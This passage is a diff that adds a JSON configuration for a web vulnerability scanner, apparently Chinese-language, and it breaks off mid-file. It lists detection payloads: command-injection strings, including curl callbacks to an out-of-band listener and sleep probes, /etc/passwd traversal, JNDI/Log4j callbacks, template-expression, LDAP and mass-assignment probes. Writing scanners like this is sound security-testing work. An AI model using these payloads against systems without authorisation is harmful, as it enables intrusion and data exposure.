@@ -1,0 +1,2180 @@
+{
+  "config_version": 24,
+  "listen": "0.0.0.0:8888",
+  "default_scheme": "https",
+  "scan_mode": "standard",
+  "timeout_seconds": 10,
+  "max_concurrency": 8,
+  "max_active_scans": 4,
+  "max_queued_scans": 32,
+  "global_max_concurrency": 32,
+  "per_host_concurrency": 12,
+  "requests_per_second": 10,
+  "global_requests_per_second": 40,
+  "max_response_bytes": 2000000,
+  "max_requests": 500,
+  "baseline_samples": 2,
+  "verify_tls": true,
+  "follow_redirects": false,
+  "allow_private_targets": true,
+  "allowed_hosts": null,
+  "proxy_url": "",
+  "transport_mode": "normalized",
+  "task_ttl_minutes": 30,
+  "redact_evidence": true,
+  "authorization_expected": true,
+  "session_identifiers": [
+    "cookie",
+    "Authorization",
+    "token",
+    "accessToken",
+    "access_token",
+    "des_sessionId",
+    "sessionId",
+    "dseSessiond",
+    "JSESSIONID",
+    "SESSION",
+    "X-Auth-Token"
+  ],
+  "excluded_parameter_names": [],
+  "command_parameter_names": [
+    "cmd",
+    "command",
+    "exec",
+    "execute",
+    "executable",
+    "program",
+    "process",
+    "script",
+    "code",
+    "expression",
+    "groovy",
+    "engine",
+    "host",
+    "ip",
+    "path",
+    "backuppath",
+    "file",
+    "url",
+    "target"
+  ],
+  "csrf_header_names": [
+    "X-CSRF-Token",
+    "X-XSRF-Token",
+    "CSRF-Token",
+    "X-CSRFToken"
+  ],
+  "api_exposure_paths": [
+    "/v3/api-docs",
+    "/v2/api-docs",
+    "/api-docs",
+    "/openapi.json",
+    "/openapi.yaml",
+    "/swagger-resources",
+    "/swagger-ui.html",
+    "/swagger-ui/index.html",
+    "/doc.html"
+  ],
+  "callback_listen": "0.0.0.0:61166",
+  "callback_base_url": "http://127.0.0.1:61166",
+  "callback_ldap_listen": "0.0.0.0:61167",
+  "callback_ldap_base_url": "ldap://127.0.0.1:61167",
+  "callback_max_connections": 128,
+  "success_patterns": [
+    "\\\"code\\\"\\s*:\\s*\\\"?(?:0|200|000000)\\\"?",
+    "\\\"success\\\"\\s*:\\s*true",
+    "发送成功",
+    "上传成功"
+  ],
+  "denied_patterns": [
+    "unauthorized",
+    "access denied",
+    "forbidden",
+    "not authenticated",
+    "未登录",
+    "无权限",
+    "请登录",
+    "登录失效",
+    "认证失败"
+  ],
+  "sqli_error_patterns": [
+    "(?is)syntax error(?:\\s+at|\\s+near|\\s+in)?",
+    "(?i)ORA-\\d{5}",
+    "(?is)(?:numeric|floating.point|value).{0,80}(?:overflow|out of range)",
+    "(?i)SQLSTATE\\s*[:\\[]?\\s*22003",
+    "(?is)(?:PSQLException|MySQLSyntaxErrorException|BadSqlGrammarException|UncategorizedSQLException)"
+  ],
+  "sqli_error_confidence": "firm",
+  "dynamic_patterns": [
+    "(?i)\\\"(?:timestamp|time|requestId|traceId|nonce)\\\"\\s*:\\s*\\\"?[^\\\",}\\s]+",
+    "\\b\\d{4}-\\d{2}-\\d{2}[T ][0-9:.+Z-]+",
+    "\\b[0-9a-fA-F]{16,64}\\b"
+  ],
+  "scan_header_names": [
+    "X-Forwarded-For",
+    "X-Original-URL",
+    "Referer",
+    "User-Agent"
+  ],
+  "request_transforms": null,
+  "response_extractors": null,
+  "max_scans_per_minute": 60,
+  "shared_service_mode": false,
+  "config_write_allowed_cidrs": null,
+  "plugin_rules": {
+    "api_exposure": {
+      "paths": [
+        "/v3/api-docs",
+        "/v2/api-docs",
+        "/api-docs",
+        "/openapi.json",
+        "/openapi.yaml",
+        "/v3/api-docs/swagger-config",
+        "/swagger-resources",
+        "/swagger-resources/configuration/ui",
+        "/swagger-ui.html",
+        "/swagger-ui/index.html",
+        "/doc.html"
+      ]
+    },
+    "command_injection": {
+      "parameter_names": [
+        "cmd",
+        "command",
+        "exec",
+        "execute",
+        "executable",
+        "program",
+        "process",
+        "script",
+        "code",
+        "expression",
+        "groovy",
+        "engine",
+        "host",
+        "ip",
+        "path",
+        "backuppath",
+        "file",
+        "url",
+        "target"
+      ],
+      "payloads": [
+        {
+          "name": "算术输出 canary",
+          "kind": "output",
+          "payload": "{{value}};printf JHS_%s $(({{left}}+{{right}}))",
+          "expected": "JHS_{{sum}}"
+        },
+        {
+          "name": "管道算术输出 canary",
+          "kind": "output",
+          "payload": "{{value}}|printf JHS_%s $(({{left}}+{{right}}))",
+          "expected": "JHS_{{sum}}"
+        },
+        {
+          "name": "逻辑或算术输出 canary",
+          "kind": "output",
+          "payload": "{{value}}||printf JHS_%s $(({{left}}+{{right}}))",
+          "expected": "JHS_{{sum}}"
+        },
+        {
+          "name": "逻辑与算术输出 canary",
+          "kind": "output",
+          "payload": "{{value}}\u0026\u0026printf JHS_%s $(({{left}}+{{right}}))",
+          "expected": "JHS_{{sum}}"
+        },
+        {
+          "name": "换行算术输出 canary",
+          "kind": "output",
+          "payload": "{{value}}\nprintf JHS_%s $(({{left}}+{{right}}))",
+          "expected": "JHS_{{sum}}"
+        },
+        {
+          "name": "反引号算术输出 canary",
+          "kind": "output",
+          "payload": "{{value}}`printf JHS_%s $(({{left}}+{{right}}))`",
+          "expected": "JHS_{{sum}}"
+        },
+        {
+          "name": "美元括号算术输出 canary",
+          "kind": "output",
+          "payload": "{{value}}$(printf JHS_%s $(({{left}}+{{right}})))",
+          "expected": "JHS_{{sum}}"
+        },
+        {
+          "name": "Runtime.exec/ProcessBuilder 直接命令",
+          "kind": "direct_output",
+          "payload": "expr {{left}} + {{right}}",
+          "expected": "{{sum}}"
+        }
+      ]
+    },
+    "command_injection_oast": {
+      "parameter_names": [
+        "cmd",
+        "command",
+        "exec",
+        "execute",
+        "executable",
+        "program",
+        "process",
+        "script",
+        "code",
+        "expression",
+        "groovy",
+        "engine",
+        "host",
+        "ip",
+        "path",
+        "backuppath",
+        "file",
+        "url",
+        "target"
+      ],
+      "payloads": [
+        {
+          "name": "curl 离线回连",
+          "kind": "callback",
+          "payload": "{{value}};curl -fsS --max-time 3 '{{callback}}' \u003e/dev/null"
+        },
+        {
+          "name": "反引号 curl 离线回连",
+          "kind": "callback",
+          "payload": "`curl -fsS --max-time 3 '{{callback}}' \u003e/dev/null`"
+        },
+        {
+          "name": "美元括号 curl 离线回连",
+          "kind": "callback",
+          "payload": "$(curl -fsS --max-time 3 '{{callback}}' \u003e/dev/null)"
+        },
+        {
+          "name": "管道 curl 离线回连",
+          "kind": "callback",
+          "payload": "{{value}}|curl -fsS --max-time 3 '{{callback}}' \u003e/dev/null"
+        },
+        {
+          "name": "逻辑或 curl 离线回连",
+          "kind": "callback",
+          "payload": "{{value}}||curl -fsS --max-time 3 '{{callback}}' \u003e/dev/null"
+        },
+        {
+          "name": "逻辑与 curl 离线回连",
+          "kind": "callback",
+          "payload": "{{value}}\u0026\u0026curl -fsS --max-time 3 '{{callback}}' \u003e/dev/null"
+        },
+        {
+          "name": "换行 curl 离线回连",
+          "kind": "callback",
+          "payload": "{{value}}\ncurl -fsS --max-time 3 '{{callback}}' \u003e/dev/null"
+        }
+      ]
+    },
+    "command_injection_timing": {
+      "parameter_names": [
+        "cmd",
+        "command",
+        "exec",
+        "execute",
+        "executable",
+        "program",
+        "process",
+        "script",
+        "code",
+        "expression",
+        "groovy",
+        "engine",
+        "host",
+        "ip",
+        "path",
+        "backuppath",
+        "file",
+        "url",
+        "target"
+      ],
+      "payloads": [
+        {
+          "name": "延时",
+          "kind": "delay",
+          "group": "sleep",
+          "payload": "{{value}};sleep 2"
+        },
+        {
+          "name": "延时控制",
+          "kind": "control",
+          "group": "sleep",
+          "payload": "{{value}};sleep 0"
+        },
+        {
+          "name": "反引号 sleep 延时",
+          "kind": "delay",
+          "group": "backtick-sleep",
+          "payload": "`sleep 2`"
+        },
+        {
+          "name": "反引号 sleep 对照",
+          "kind": "control",
+          "group": "backtick-sleep",
+          "payload": "`sleep 0`"
+        },
+        {
+          "name": "美元括号 sleep 延时",
+          "kind": "delay",
+          "group": "dollar-sleep",
+          "payload": "$(sleep 2)"
+        },
+        {
+          "name": "美元括号 sleep 对照",
+          "kind": "control",
+          "group": "dollar-sleep",
+          "payload": "$(sleep 0)"
+        },
+        {
+          "name": "管道 sleep 延时",
+          "kind": "delay",
+          "group": "pipe-sleep",
+          "payload": "{{value}}|sleep 2"
+        },
+        {
+          "name": "管道 sleep 对照",
+          "kind": "control",
+          "group": "pipe-sleep",
+          "payload": "{{value}}|sleep 0"
+        },
+        {
+          "name": "逻辑或 sleep 延时",
+          "kind": "delay",
+          "group": "or-sleep",
+          "payload": "{{value}}||sleep 2"
+        },
+        {
+          "name": "逻辑或 sleep 对照",
+          "kind": "control",
+          "group": "or-sleep",
+          "payload": "{{value}}||sleep 0"
+        },
+        {
+          "name": "逻辑与 sleep 延时",
+          "kind": "delay",
+          "group": "and-sleep",
+          "payload": "{{value}}\u0026\u0026sleep 2"
+        },
+        {
+          "name": "逻辑与 sleep 对照",
+          "kind": "control",
+          "group": "and-sleep",
+          "payload": "{{value}}\u0026\u0026sleep 0"
+        },
+        {
+          "name": "换行 sleep 延时",
+          "kind": "delay",
+          "group": "newline-sleep",
+          "payload": "{{value}}\nsleep 2"
+        },
+        {
+          "name": "换行 sleep 对照",
+          "kind": "control",
+          "group": "newline-sleep",
+          "payload": "{{value}}\nsleep 0"
+        },
+        {
+          "name": "Groovy/脚本 sleep 延时",
+          "kind": "delay",
+          "group": "groovy-sleep",
+          "payload": "sleep(2000)"
+        },
+        {
+          "name": "Groovy/脚本 sleep 对照",
+          "kind": "control",
+          "group": "groovy-sleep",
+          "payload": "sleep(0)"
+        }
+      ]
+    },
+    "cors": {
+      "payloads": [
+        {
+          "name": "任意来源",
+          "payload": "https://jungle-happy-scan.invalid"
+        },
+        {
+          "name": "null 来源",
+          "payload": "null"
+        },
+        {
+          "name": "后缀绕过",
+          "payload": "https://{{host}}.jungle-happy-scan.invalid"
+        }
+      ]
+    },
+    "crlf_injection": {
+      "payloads": [
+        {
+          "name": "CRLF 响应头",
+          "payload": "{{value}}\r\nX-Jungle-Happy-Scan-Canary: {{token}}",
+          "header": "X-Jungle-Happy-Scan-Canary"
+        }
+      ]
+    },
+    "csrf": {
+      "payloads": [
+        {
+          "name": "跨站 Origin",
+          "kind": "origin",
+          "payload": "https://jungle-happy-scan.invalid"
+        }
+      ]
+    },
+    "error_disclosure": {
+      "payloads": [
+        {
+          "name": "单引号异常",
+          "payload": "{{value}}'"
+        },
+        {
+          "name": "双引号异常",
+          "payload": "{{value}}\""
+        },
+        {
+          "name": "反斜杠异常",
+          "payload": "{{value}}\\"
+        }
+      ],
+      "patterns": [
+        {
+          "name": "Java 异常堆栈",
+          "pattern": "(?is)(?:Caused by:\\s*)?(?:java|javax|jakarta|org\\.springframework|org\\.apache\\.ibatis)\\.[\\w.$]+(?:Exception|Error)(?::[^\\r\\n]{0,300})?.{0,700}?\\bat\\s+[\\w$]+(?:\\.[\\w$]+)+\\([^\\r\\n]+\\.java:\\d+\\)",
+          "severity": "medium",
+          "confidence": "certain"
+        },
+        {
+          "name": "Spring/Jackson 参数异常",
+          "pattern": "(?is)(HttpMessageNotReadableException|MethodArgumentTypeMismatchException|NestedServletException|BindException|SpelEvaluationException|MismatchedInputException|InvalidFormatException|JsonMappingException|JsonParseException|ConstraintViolationException)",
+          "severity": "medium",
+          "confidence": "certain"
+        },
+        {
+          "name": "JSP/Servlet 容器异常",
+          "pattern": "(?is)(org\\.apache\\.jasper\\.(?:JasperException|runtime\\.[\\w.$]+)|javax\\.servlet\\.(?:ServletException|jsp\\.[\\w.$]+)|jakarta\\.servlet\\.(?:ServletException|jsp\\.[\\w.$]+)|HTTP Status 500.{0,500}(?:Apache Tomcat|Exception Report)|The server encountered an internal error.{0,500}Tomcat)",
+          "severity": "medium",
+          "confidence": "certain"
+        },
+        {
+          "name": "银行 CTP/自研框架内部堆栈",
+          "pattern": "(?is)(?:com\\.(?:icbc|bank|ctp)|cn\\.(?:icbc|bank|ctp))\\.[\\w.$]+(?:Exception|Error)?.{0,700}?\\bat\\s+(?:com|cn)\\.(?:icbc|bank|ctp)\\.[\\w.$]+\\([^\\r\\n]+\\.java:\\d+\\)",
+          "severity": "medium",
+          "confidence": "certain"
+        },
+        {
+          "name": "MyBatis/SQL 调试信息",
+          "pattern": "(?is)(#{3}\\s*(?:Error (?:querying|updating) database|SQL:|Cause:)|The error may exist in .{0,200}(?:Mapper|\\.xml)|BadSqlGrammarException|PersistenceException|CallableStatement|PreparedStatement.{0,200}(?:SELECT|INSERT|UPDATE|DELETE))",
+          "severity": "high",
+          "confidence": "certain"
+        },
+        {
+          "name": "数据库异常详情",
+          "pattern": "(?is)(PSQLException|MySQLSyntaxErrorException|SQLSTATE\\s*[:\\[]|You have an error in your SQL syntax|invalid input syntax for (?:type|integer|numeric|uuid))",
+          "severity": "high",
+          "confidence": "certain"
+        },
+        {
+          "name": "Linux 服务端绝对路径",
+          "pattern": "(?is)(?:/[A-Za-z0-9_.-]+){4,}/[A-Za-z0-9_.-]+\\.(?:java|xml|class|jar)",
+          "severity": "medium",
+          "confidence": "firm"
+        }
+      ]
+    },
+    "error_disclosure_extended": {
+      "payloads": [
+        {
+          "name": "超大整数边界",
+          "payload": "9223372036854775808"
+        },
+        {
+          "name": "非法日期边界",
+          "payload": "9999-99-99T99:99:99"
+        },
+        {
+          "name": "空字节文本",
+          "payload": "{{value}}%00"
+        }
+      ],
+      "patterns": [
+        {
+          "name": "Java 异常堆栈",
+          "pattern": "(?is)(?:Caused by:\\s*)?(?:java|javax|jakarta|org\\.springframework|org\\.apache\\.ibatis)\\.[\\w.$]+(?:Exception|Error)(?::[^\\r\\n]{0,300})?.{0,700}?\\bat\\s+[\\w$]+(?:\\.[\\w$]+)+\\([^\\r\\n]+\\.java:\\d+\\)",
+          "severity": "medium",
+          "confidence": "certain"
+        },
+        {
+          "name": "Spring/Jackson 参数异常",
+          "pattern": "(?is)(HttpMessageNotReadableException|MethodArgumentTypeMismatchException|NestedServletException|BindException|SpelEvaluationException|MismatchedInputException|InvalidFormatException|JsonMappingException|JsonParseException|ConstraintViolationException)",
+          "severity": "medium",
+          "confidence": "certain"
+        },
+        {
+          "name": "JSP/Servlet 容器异常",
+          "pattern": "(?is)(org\\.apache\\.jasper\\.(?:JasperException|runtime\\.[\\w.$]+)|javax\\.servlet\\.(?:ServletException|jsp\\.[\\w.$]+)|jakarta\\.servlet\\.(?:ServletException|jsp\\.[\\w.$]+)|HTTP Status 500.{0,500}(?:Apache Tomcat|Exception Report)|The server encountered an internal error.{0,500}Tomcat)",
+          "severity": "medium",
+          "confidence": "certain"
+        },
+        {
+          "name": "银行 CTP/自研框架内部堆栈",
+          "pattern": "(?is)(?:com\\.(?:icbc|bank|ctp)|cn\\.(?:icbc|bank|ctp))\\.[\\w.$]+(?:Exception|Error)?.{0,700}?\\bat\\s+(?:com|cn)\\.(?:icbc|bank|ctp)\\.[\\w.$]+\\([^\\r\\n]+\\.java:\\d+\\)",
+          "severity": "medium",
+          "confidence": "certain"
+        },
+        {
+          "name": "MyBatis/SQL 调试信息",
+          "pattern": "(?is)(#{3}\\s*(?:Error (?:querying|updating) database|SQL:|Cause:)|The error may exist in .{0,200}(?:Mapper|\\.xml)|BadSqlGrammarException|PersistenceException|CallableStatement|PreparedStatement.{0,200}(?:SELECT|INSERT|UPDATE|DELETE))",
+          "severity": "high",
+          "confidence": "certain"
+        },
+        {
+          "name": "数据库异常详情",
+          "pattern": "(?is)(PSQLException|MySQLSyntaxErrorException|SQLSTATE\\s*[:\\[]|You have an error in your SQL syntax|invalid input syntax for (?:type|integer|numeric|uuid))",
+          "severity": "high",
+          "confidence": "certain"
+        },
+        {
+          "name": "Linux 服务端绝对路径",
+          "pattern": "(?is)(?:/[A-Za-z0-9_.-]+){4,}/[A-Za-z0-9_.-]+\\.(?:java|xml|class|jar)",
+          "severity": "medium",
+          "confidence": "firm"
+        }
+      ]
+    },
+    "file_read": {
+      "parameter_names": [
+        "file",
+        "path",
+        "filename",
+        "filepath",
+        "download",
+        "template",
+        "resource",
+        "document",
+        "dir",
+        "attachment"
+      ],
+      "payloads": [
+        {
+          "name": "passwd 目录穿越",
+          "payload": "../../../../../../etc/passwd",
+          "expected": "(?m)^root:x?:0:0:"
+        },
+        {
+          "name": "passwd 绝对路径",
+          "payload": "/etc/passwd",
+          "expected": "(?m)^root:x?:0:0:"
+        },
+        {
+          "name": "hosts 目录穿越",
+          "payload": "../../../../../../etc/hosts",
+          "expected": "(?m)^(?:127\\.0\\.0\\.1|::1)[\\t ]+(?:localhost(?:\\.localdomain)?|ip6-localhost)(?:[\\t ]|$)"
+        },
+        {
+          "name": "hosts 绝对路径",
+          "payload": "/etc/hosts",
+          "expected": "(?m)^(?:127\\.0\\.0\\.1|::1)[\\t ]+(?:localhost(?:\\.localdomain)?|ip6-localhost)(?:[\\t ]|$)"
+        },
+        {
+          "name": "proc/version 目录穿越",
+          "payload": "../../../../../../proc/version",
+          "expected": "(?im)^Linux version [0-9]+\\.[0-9]+(?:\\.[0-9]+)?[^\\r\\n]{0,300}$"
+        },
+        {
+          "name": "proc/version 绝对路径",
+          "payload": "/proc/version",
+          "expected": "(?im)^Linux version [0-9]+\\.[0-9]+(?:\\.[0-9]+)?[^\\r\\n]{0,300}$"
+        },
+        {
+          "name": "os-release 目录穿越",
+          "payload": "../../../../../../etc/os-release",
+          "expected": "(?ms)^(?:NAME|PRETTY_NAME)=.{1,500}^ID=\"?[\\w.-]+\"?[\\t ]*$"
+        },
+        {
+          "name": "os-release 绝对路径",
+          "payload": "/etc/os-release",
+          "expected": "(?ms)^(?:NAME|PRETTY_NAME)=.{1,500}^ID=\"?[\\w.-]+\"?[\\t ]*$"
+        }
+      ]
+    },
+    "file_read_encoded": {
+      "parameter_names": [
+        "file",
+        "path",
+        "filename",
+        "filepath",
+        "download",
+        "template",
+        "resource",
+        "document",
+        "dir",
+        "attachment"
+      ],
+      "payloads": [
+        {
+          "name": "passwd 双重编码穿越",
+          "payload": "%2e%2e%252f%2e%2e%252fetc%252fpasswd",
+          "expected": "(?m)^root:x?:0:0:"
+        },
+        {
+          "name": "hosts 双重编码穿越",
+          "payload": "%2e%2e%252f%2e%2e%252fetc%252fhosts",
+          "expected": "(?m)^(?:127\\.0\\.0\\.1|::1)[\\t ]+(?:localhost(?:\\.localdomain)?|ip6-localhost)(?:[\\t ]|$)"
+        },
+        {
+          "name": "proc/version 双重编码穿越",
+          "payload": "%2e%2e%252f%2e%2e%252fproc%252fversion",
+          "expected": "(?im)^Linux version [0-9]+\\.[0-9]+(?:\\.[0-9]+)?[^\\r\\n]{0,300}$"
+        },
+        {
+          "name": "hosts 非标准路径归一化",
+          "payload": "....//....//....//....//....//....//etc/hosts",
+          "expected": "(?m)^(?:127\\.0\\.0\\.1|::1)[\\t ]+(?:localhost(?:\\.localdomain)?|ip6-localhost)(?:[\\t ]|$)"
+        },
+        {
+          "name": "hosts file URI",
+          "payload": "file:///etc/hosts",
+          "expected": "(?m)^(?:127\\.0\\.0\\.1|::1)[\\t ]+(?:localhost(?:\\.localdomain)?|ip6-localhost)(?:[\\t ]|$)"
+        }
+      ]
+    },
+    "file_upload": {
+      "payloads": [
+        {
+          "name": "JSP 文件",
+          "payload": "jungle-happy-scan-canary.jsp",
+          "expected": "(?i)(upload(?:ed)?\\s+success|successfully\\s+uploaded|上传成功|保存成功|\"(?:code|status)\"\\s*:\\s*\"?(?:0|200|000000)\"?)",
+          "mime": "application/octet-stream"
+        },
+        {
+          "name": "JSPX 文件",
+          "payload": "jungle-happy-scan-canary.jspx",
+          "expected": "(?i)(upload(?:ed)?\\s+success|successfully\\s+uploaded|上传成功|保存成功|\"(?:code|status)\"\\s*:\\s*\"?(?:0|200|000000)\"?)",
+          "mime": "application/octet-stream"
+        },
+        {
+          "name": "PHP 文件",
+          "payload": "jungle-happy-scan-canary.php",
+          "expected": "(?i)(upload(?:ed)?\\s+success|successfully\\s+uploaded|上传成功|保存成功|\"(?:code|status)\"\\s*:\\s*\"?(?:0|200|000000)\"?)",
+          "mime": "application/octet-stream"
+        },
+        {
+          "name": "EXE 文件",
+          "payload": "jungle-happy-scan-canary.exe",
+          "expected": "(?i)(upload(?:ed)?\\s+success|successfully\\s+uploaded|上传成功|保存成功|\"(?:code|status)\"\\s*:\\s*\"?(?:0|200|000000)\"?)",
+          "mime": "application/octet-stream"
+        },
+        {
+          "name": "Shell 脚本文件",
+          "payload": "jungle-happy-scan-canary.sh",
+          "expected": "(?i)(upload(?:ed)?\\s+success|successfully\\s+uploaded|上传成功|保存成功|\"(?:code|status)\"\\s*:\\s*\"?(?:0|200|000000)\"?)",
+          "mime": "image/png"
+        },
+        {
+          "name": "HTML 文件",
+          "payload": "jungle-happy-scan-canary.html",
+          "expected": "(?i)(upload(?:ed)?\\s+success|successfully\\s+uploaded|上传成功|保存成功|\"(?:code|status)\"\\s*:\\s*\"?(?:0|200|000000)\"?)",
+          "mime": "text/html"
+        },
+        {
+          "name": "Python 文件",
+          "payload": "jungle-happy-scan-canary.py",
+          "expected": "(?i)(upload(?:ed)?\\s+success|successfully\\s+uploaded|上传成功|保存成功|\"(?:code|status)\"\\s*:\\s*\"?(?:0|200|000000)\"?)",
+          "mime": "text/x-python"
+        }
+      ]
+    },
+    "file_upload_execution": {
+      "payloads": [
+        {
+          "name": "双扩展 JSP",
+          "payload": "jungle-happy-scan-canary.jpg.jsp",
+          "expected": "(?i)(upload(?:ed)?\\s+success|successfully\\s+uploaded|上传成功|保存成功|\"(?:code|status)\"\\s*:\\s*\"?(?:0|200|000000)\"?)",
+          "mime": "image/jpeg"
+        },
+        {
+          "name": "JSP 无害执行确认",
+          "kind": "execute_canary",
+          "payload": "jungle-happy-scan-exec.jsp",
+          "expected": "(?i)(upload(?:ed)?\\s+success|successfully\\s+uploaded|上传成功|保存成功|\"(?:code|status)\"\\s*:\\s*\"?(?:0|200|000000)\"?)",
+          "mime": "application/octet-stream"
+        }
+      ]
+    },
+    "graphql_alias_abuse": {
+      "paths": [
+        "/graphql"
+      ],
+      "payloads": [
+        {
+          "name": "32 别名批处理",
+          "kind": "alias_batch",
+          "payload": "{jhs1:__typename jhs32:__typename}",
+          "expected": "(?is)\"jhs1\".{0,1000}\"jhs32\""
+        }
+      ]
+    },
+    "graphql_security": {
+      "paths": [
+        "/graphql"
+      ],
+      "payloads": [
+        {
+          "name": "Schema Introspection",
+          "kind": "introspection",
+          "payload": "{__schema{queryType{name} types{name}}}",
+          "expected": "(?is)\"__schema\"\\s*:\\s*\\{.{0,1000}\"queryType\""
+        },
+        {
+          "name": "字段建议",
+          "kind": "suggestion",
+          "payload": "{__jungle_happy_scan_invalid_field__}",
+          "expected": "(?i)did you mean"
+        },
+        {
+          "name": "20 项 JSON 批量请求",
+          "kind": "batch",
+          "payload": "[{\"query\":\"{__typename}\"}]",
+          "expected": "(?is)^\\s*\\["
+        }
+      ]
+    },
+    "host_header_injection": {
+      "payloads": [
+        {
+          "name": "X-Forwarded-Host",
+          "kind": "header",
+          "payload": "{{host}}",
+          "header": "X-Forwarded-Host"
+        },
+        {
+          "name": "X-Host",
+          "kind": "header",
+          "payload": "{{host}}",
+          "header": "X-Host"
+        },
+        {
+          "name": "Forwarded host",
+          "kind": "header",
+          "payload": "host={{host}}",
+          "header": "Forwarded"
+        }
+      ]
+    },
+    "idor": {
+      "parameter_names": [
+        "id",
+        "uid",
+        "uuid",
+        "user",
+        "account",
+        "order",
+        "document",
+        "record"
+      ]
+    },
+    "java_deserialization": {
+      "parameter_names": [
+        "data",
+        "payload",
+        "object",
+        "serialized",
+        "state",
+        "token"
+      ],
+      "payloads": [
+        {
+          "name": "畸形 Java ObjectStream",
+          "kind": "error_probe",
+          "payload": "rO0ABXNyAANqaHM="
+        },
+        {
+          "name": "畸形 Hessian 对象",
+          "kind": "error_probe",
+          "payload": "SAJq\n"
+        },
+        {
+          "name": "畸形 Java ObjectStream 深度复核",
+          "kind": "error_probe",
+          "payload": "rO0ABXNyABFqdW5nbGVfaGFwcHlfc2Nhbg=="
+        }
+      ],
+      "patterns": [
+        {
+          "name": "Java 反序列化异常",
+          "pattern": "(?is)(ObjectInputStream|ObjectStreamClass|StreamCorruptedException|InvalidClassException|OptionalDataException|WriteAbortedException|SerializationException|HessianProtocolException|KryoException|InvalidTypeIdException|could not resolve type id|could not deserialize)",
+          "severity": "high",
+          "confidence": "certain"
+        }
+      ]
+    },
+    "java_expression": {
+      "payloads": [
+        {
+          "name": "Spring EL",
+          "kind": "spel",
+          "payload": "${{{left}}*{{right}}}"
+        },
+        {
+          "name": "Spring EL #{ }",
+          "kind": "spel",
+          "payload": "#{{{left}}*{{right}}}"
+        },
+        {
+          "name": "SpEL/Groovy 裸表达式",
+          "kind": "raw_expression",
+          "payload": "{{left}}*{{right}}"
+        }
+      ]
+    },
+    "java_expression_extended": {
+      "payloads": [
+        {
+          "name": "Thymeleaf *{ }",
+          "kind": "thymeleaf",
+          "payload": "*{{{left}}*{{right}}}"
+        },
+        {
+          "name": "Thymeleaf 预处理",
+          "kind": "thymeleaf",
+          "payload": "__${{{left}}*{{right}}}__"
+        },
+        {
+          "name": "Thymeleaf 预处理选择器",
+          "kind": "thymeleaf",
+          "payload": "__${{{left}}*{{right}}}__::.x"
+        },
+        {
+          "name": "OGNL %{ }",
+          "kind": "ognl",
+          "payload": "%{{{left}}*{{right}}}"
+        },
+        {
+          "name": "JSP EL",
+          "kind": "jsp_el",
+          "payload": "${{{left}}*{{right}}}"
+        },
+        {
+          "name": "FreeMarker",
+          "kind": "freemarker",
+          "payload": "${{{left}}*{{right}}}"
+        },
+        {
+          "name": "Velocity",
+          "kind": "velocity",
+          "payload": "#set($jhs={{left}}*{{right}})$jhs"
+        }
+      ]
+    },
+    "jndi_injection": {
+      "payloads": [
+        {
+          "name": "Log4j/JNDI User-Agent",
+          "kind": "callback",
+          "payload": "${jndi:{{callback}}}",
+          "header": "User-Agent"
+        },
+        {
+          "name": "Log4j/JNDI X-Api-Version",
+          "kind": "callback",
+          "payload": "${jndi:{{callback}}}",
+          "header": "X-Api-Version"
+        }
+      ]
+    },
+    "json_polymorphic": {
+      "payloads": [
+        {
+          "name": "Fastjson SafeMode 探针",
+          "group": "@type",
+          "payload": "\"jungle.happy.scan.SafeModeProbe731\"",
+          "expected": "jungle.happy.scan.SafeModeProbe731"
+        }
+      ],
+      "patterns": [
+        {
+          "name": "Fastjson SafeMode 已开启",
+          "pattern": "(?is)safeMode\\s+not\\s+support\\s+autoType",
+          "severity": "info",
+          "confidence": "certain"
+        },
+        {
+          "name": "Fastjson SafeMode 未开启特征",
+          "pattern": "(?is)(?:autoType\\s+is\\s+not\\s+support|com\\.alibaba\\.fastjson|fastjson(?:2)?\\.JSONException|type\\s+not\\s+match|ClassNotFoundException).{0,600}jungle\\.happy\\.scan\\.SafeModeProbe731|jungle\\.happy\\.scan\\.SafeModeProbe731.{0,600}(?:autoType\\s+is\\s+not\\s+support|com\\.alibaba\\.fastjson|fastjson(?:2)?\\.JSONException|type\\s+not\\s+match|ClassNotFoundException)",
+          "severity": "high",
+          "confidence": "certain"
+        }
+      ]
+    },
+    "ldap_injection": {
+      "payloads": [
+        {
+          "name": "LDAP 过滤器真",
+          "kind": "boolean_true",
+          "group": "ldap-filter",
+          "payload": "{{value}}*)(|(objectClass=*))"
+        },
+        {
+          "name": "LDAP 过滤器假",
+          "kind": "boolean_false",
+          "group": "ldap-filter",
+          "payload": "{{value}}*)(objectClass=__jhs_no_match_731__)"
+        },
+        {
+          "name": "LDAP 括号破坏",
+          "kind": "error_probe",
+          "payload": "{{value}})("
+        }
+      ],
+      "patterns": [
+        {
+          "name": "LDAP 过滤器异常",
+          "pattern": "(?is)(InvalidSearchFilterException|javax\\.naming\\.(?:directory\\.)?InvalidSearchFilterException|LDAPException.{0,180}(?:filter|search)|Bad search filter|Unbalanced parenthesis|Filter Error Code)",
+          "severity": "high",
+          "confidence": "certain"
+        }
+      ]
+    },
+    "mass_assignment": {
+      "payloads": [
+        {
+          "name": "管理员标识",
+          "group": "isAdmin",
+          "payload": "true",
+          "expected": "(?is)\"isAdmin\"\\s*:\\s*true"
+        },
+        {
+          "name": "角色字段",
+          "group": "role",
+          "payload": "\"admin\"",
+          "expected": "(?is)\"role\"\\s*:\\s*\"admin\""
+        },
+        {
+          "name": "机构归属",
+          "group": "orgId",
+          "payload": "\"jhs-org-731\"",
+          "expected": "(?is)\"orgId\"\\s*:\\s*\"jhs-org-731\""
+        },
+        {
+          "name": "数据所有者",
+          "group": "ownerId",
+          "payload": "\"jhs-owner-731\"",
+          "expected": "(?is)\"ownerId\"\\s*:\\s*\"jhs-owner-731\""
+        }
+      ]
+    },
+    "mass_assignment_extended": {
+      "payloads": [
+        {
+          "name": "审批状态",
+          "group": "status",
+          "payload": "\"approved\"",
+          "expected": "(?is)\"status\"\\s*:\\s*\"approved\""
+        },
+        {
+          "name": "启用标识",
+          "group": "enabled",
+          "payload": "true",
+          "expected": "(?is)\"enabled\"\\s*:\\s*true"
+        },
+        {
+          "name": "嵌套角色字段",
+          "group": "user.role",
+          "payload": "\"admin\"",
+          "expected": "(?is)\"role\"\\s*:\\s*\"admin\""
+        }
+      ]
+    },
+    "method_override": {
+      "payloads": [
+        {
+          "name": "X-HTTP-Method-Override DELETE",
+          "kind": "header",
+          "payload": "DELETE",
+          "expected": "(?is)(?:deleted|删除成功|\"status\"\\s*:\\s*\"?(?:deleted|success))",
+          "header": "X-HTTP-Method-Override"
+        },
+        {
+          "name": "Spring query _method DELETE",
+          "kind": "query_param",
+          "group": "_method",
+          "payload": "DELETE",
+          "expected": "(?is)(?:deleted|删除成功|\"status\"\\s*:\\s*\"?(?:deleted|success))"
+        },
+        {
